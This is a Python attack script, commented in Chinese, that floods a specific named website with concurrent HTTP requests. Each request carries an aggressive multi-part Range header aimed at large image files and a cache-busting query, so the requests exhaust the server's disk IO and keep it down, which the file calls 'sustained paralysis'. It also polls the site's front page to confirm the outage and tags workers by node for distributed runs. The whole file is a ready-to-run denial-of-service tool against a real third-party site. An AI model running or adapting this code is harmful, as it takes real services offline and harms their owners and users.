#!/usr/bin/env python3
"""
Range IO 耗尽 v2 - 持续瘫痪
改进: asyncio 高并发 + 加大 worker + 更长持续 + 更激进 Range
每一帧都不给 Nginx 喘息机会
"""
import asyncio
import aiohttp
import time
import random
import os
import uuid

TARGET = "https://www.xnmoe.com"
DURATION = int(os.environ.get("DURATION", "1200"))
CONCURRENT = int(os.environ.get("CONCURRENT", "50"))
NODE_ID = os.environ.get("NODE_ID", "0")

# 只打最大的文件 — IO 消耗最大
BIG_TARGETS = [
    "/assets/images/banner.jpg",      # 269KB
    "/assets/images/pfp.png",         # 106KB  
    "/assets/images/player.png",
    "/assets/images/album_cover.jpg",
]

# 超激进 Range — 每请求 10+ 次磁盘寻址
RANGES = [
    "bytes=0-,64-,128-,256-,512-,1024-,2048-,4096-,8192-,16384-,32768-",
    "bytes=0-,128-,256-,1024-,2048-,4096-,8192-,16384-,32768-,65536-",
    "bytes=32-,64-,128-,256-,512-,1024-,2048-,4096-,8192-,16384-",
]

stats = {"req": 0, "ok": 0, "err": 0, "to": 0, "502": 0}
lock = asyncio.Lock()
down = False


async def range_blaster(session, wid):
    """单个异步 Range 爆破器"""
    global down
    while True:
        target = random.choice(BIG_TARGETS)
        rng = random.choice(RANGES)
        url = f"{TARGET}{target}?_r={uuid.uuid4().hex[:10]}"
        
        try:
            async with session.get(url, headers={
                "Range": rng,
                "User-Agent": f"Mozilla/5.0 RB-{NODE_ID}-{wid}",
                "Cache-Control": "no-cache",
            }, timeout=aiohttp.ClientTimeout(total=15), ssl=False) as resp:
                await resp.read()
                async with lock:
                    stats["req"] += 1
                    stats["ok"] += 1
                    if resp.status in (502, 503, 504):
                        stats["502"] += 1
                        down = True
                        print(f"\n  *** HTTP {resp.status} ***\n", flush=True)
        except asyncio.TimeoutError:
            async with lock:
                stats["req"] += 1
                stats["to"] += 1
        except aiohttp.ClientResponseError as e:
            async with lock:
                stats["req"] += 1
                stats["err"] += 1
                if e.status in (502, 503, 504):
                    stats["502"] += 1
                    down = True
        except Exception:
            async with lock:
                stats["req"] += 1
                stats["err"] += 1


async def checker(session):
    """检查前端是否存活"""
    global down
    while True:
        for page in ["/", "/guestbook.html"]:
            url = f"{TARGET}{page}?_ck={uuid.uuid4().hex[:6]}"
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=8), ssl=False) as resp:
                    await resp.read()
                    if resp.status in (502, 503, 504):
                        down = True
                        print(f"\n  *** FRONTEND {resp.status} on {page} ***\n", flush=True)
            except (asyncio.TimeoutError, Exception):
                down = True
        await asyncio.sleep(3)


async def monitor():
    t0 = time.time()
    while True:
        await asyncio.sleep(15)
        async with lock:
            r, ok, e, to = stats["req"], stats["ok"], stats["err"], stats["to"]
        elapsed = time.time() - t0
        rate = r / elapsed * 60 if elapsed > 0 else 0
        print(f"  [{time.strftime('%H:%M:%S')}] {elapsed:.0f}s | "
              f"Frontend: {'DOWN' if down else 'FIGHTING'} | "
              f"Req:{r}({rate:.0f}/min) OK:{ok} TO:{to} ERR:{e}",
              flush=True)


async def main():
    print(f"\n{'='*65}")
    print(f" RANGE IO EXHAUSTION v2 — SUSTAINED PARALYSIS")
    print(f" Node: {NODE_ID} | Concurrent: {CONCURRENT}")
    print(f" Duration: {DURATION}s")
    print(f" Targets: {BIG_TARGETS}")
    print(f"{'='*65}\n")

    connector = aiohttp.TCPConnector(limit=0, force_close=False, enable_cleanup_closed=True)
    async with aiohttp.ClientSession(connector=connector) as session:
        asyncio.create_task(monitor())
        asyncio.create_task(checker(session))
        
        # 所有 worker 做 Range 爆破
        tasks = [asyncio.create_task(range_blaster(session, i)) for i in range(CONCURRENT)]
        
        try:
            await asyncio.sleep(DURATION)
        finally:
            for t in tasks:
                t.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
    
    async with lock:
        r, ok, e, to = stats["req"], stats["ok"], stats["err"], stats["to"]
    print(f"\n{'='*65}")
    print(f" FINAL: Req:{r} OK:{ok} TO:{to} ERR:{e}")
    print(f" Frontend DOWN: {down}")
    print(f"{'='*65}\n")


if __name__ == "__main__":
    asyncio.run(main())
